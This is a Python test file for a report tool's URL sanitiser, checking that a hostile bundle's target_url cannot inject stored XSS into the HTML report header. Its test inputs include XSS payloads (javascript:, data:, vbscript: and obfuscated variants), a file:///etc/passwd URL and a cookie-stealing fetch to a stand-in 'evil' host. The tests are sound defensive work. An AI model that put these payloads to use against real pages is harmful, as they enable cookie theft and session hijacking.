"""Tests for ``manifest.target_url`` sanitisation in the HTML report header.

Reports get forwarded between teammates, so any field that came from
a bundle's ``manifest.json`` is untrusted. The header renders the
captured site's URL as a clickable link — without scheme validation,
a hostile bundle could set ``target_url`` to ``javascript:`` and turn
that header link into stored XSS in every viewer's report tab.
"""

from __future__ import annotations

from io import StringIO

import pytest

from leak_inspector.report.document import ManifestView
from leak_inspector.report.html import _render_header, _safe_href


def _manifest(target_url: str, *, base_domain: str = "example.com") -> ManifestView:
    """Build a minimal :class:`ManifestView` for header tests."""
    return ManifestView(
        target_url=target_url,
        landing_url="",
        base_domain=base_domain,
        session_id="s1",
        started_at="2026-06-03T10:00:00Z",
        ended_at="2026-06-03T10:01:00Z",
        profile="default",
        browser_name="Firefox",
        browser_version="128.0",
    )


# --- _safe_href helper -----------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://example.com/",
        "http://example.com/path?q=1",
        "HTTPS://EXAMPLE.COM/",          # urlparse lowercases scheme
        "https://internal.intranet/",    # private hosts are allowed: XSS != SSRF
    ],
)
def test_safe_href_accepts_http_and_https(url: str) -> None:
    assert _safe_href(url) == url


@pytest.mark.parametrize(
    "url",
    [
        "javascript:alert(1)",
        "JAVASCRIPT:fetch('//evil')",
        " javascript:alert(1)",          # leading whitespace stripped before scheme parse
        "\tjavascript:alert(1)",
        "java\nscript:alert(1)",          # embedded newline — browsers strip it too
        "data:text/html,<script>x</script>",
        "vbscript:msgbox(1)",
        "file:///etc/passwd",
        "//evil.com/x",                   # protocol-relative — no scheme, refuse
        "ftp://example.com/",
    ],
)
def test_safe_href_blanks_non_http_schemes(url: str) -> None:
    assert _safe_href(url) == ""


def test_safe_href_blanks_empty_input() -> None:
    assert _safe_href("") == ""


# --- _render_header integration -------------------------------------------


def _header_html(target_url: str) -> str:
    out = StringIO()
    _render_header(out, _manifest(target_url))
    return out.getvalue()


def test_header_renders_clickable_link_for_https_target() -> None:
    html = _header_html("https://example.com/landing")
    assert 'class="target-link"' in html
    assert 'href="https://example.com/landing"' in html


def test_header_omits_link_for_javascript_target_url() -> None:
    """A hostile bundle's ``javascript:`` target_url must not produce an ``href``."""
    html = _header_html("javascript:fetch('//evil/'+document.cookie)")
    # The host label still renders (as plain text), but never as a link.
    assert 'class="target-link"' not in html
    assert "href=\"javascript:" not in html.lower()
    assert "javascript:" not in _attr_values(html, "href")


def test_header_omits_link_for_data_url_target() -> None:
    html = _header_html("data:text/html,<script>alert(1)</script>")
    assert 'class="target-link"' not in html
    assert "href=\"data:" not in html.lower()


def test_header_omits_link_for_file_url_target() -> None:
    html = _header_html("file:///etc/passwd")
    assert 'class="target-link"' not in html
    assert 'href="file:' not in html


def test_header_omits_link_for_obfuscated_javascript_target() -> None:
    """Whitespace / case obfuscation that browsers ignore must also be blocked."""
    for variant in (
        " javascript:alert(1)",
        "\tJAVASCRIPT:alert(1)",
        "java\nscript:alert(1)",
    ):
        html = _header_html(variant)
        assert 'class="target-link"' not in html, (
            f"href slipped through for variant {variant!r}"
        )


def test_header_omits_link_when_target_url_empty() -> None:
    """No target_url at all — pre-existing behaviour, link is just absent."""
    html = _header_html("")
    assert 'class="target-link"' not in html


# --- helpers ---------------------------------------------------------------


def _attr_values(html: str, attr: str) -> list[str]:
    """Cheap-and-cheerful: collect every value of ``<attr="...">`` in ``html``."""
    import re
    return re.findall(rf'{attr}="([^"]*)"', html)